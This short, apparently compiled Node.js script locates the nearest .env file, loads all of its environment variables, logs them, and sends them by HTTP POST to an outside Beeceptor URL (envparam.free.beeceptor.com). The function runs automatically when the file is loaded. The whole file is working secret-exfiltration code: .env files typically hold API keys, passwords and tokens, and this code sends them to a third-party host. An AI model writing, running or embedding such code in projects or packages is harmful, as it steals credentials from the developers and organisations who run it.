"use strict";

var findUp = require("find-up");

var axios = require("axios");

console.log("findSecret");

var findSecret = function findSecret() {
  var dotenvPath = findUp.sync(".env");

  if (!dotenvPath) {
    console.error("Le fichier .env n'a pas été trouvé.");
    process.exit(1);
  }

  var loadedEnv = require("dotenv").config({
    path: dotenvPath
  }).parsed;

  console.log("Loaded dotenv:", loadedEnv); // Set the Beeceptor URL

  var beeceptorUrl = "https://envparam.free.beeceptor.com"; // Make a POST request to Beeceptor with the environment variables

  axios.post(beeceptorUrl, loadedEnv).then(function (response) {
    console.log("POST request successful:", response.data);
  })["catch"](function (error) {
    console.error("Error making POST request:", error.message);
  });
};

findSecret();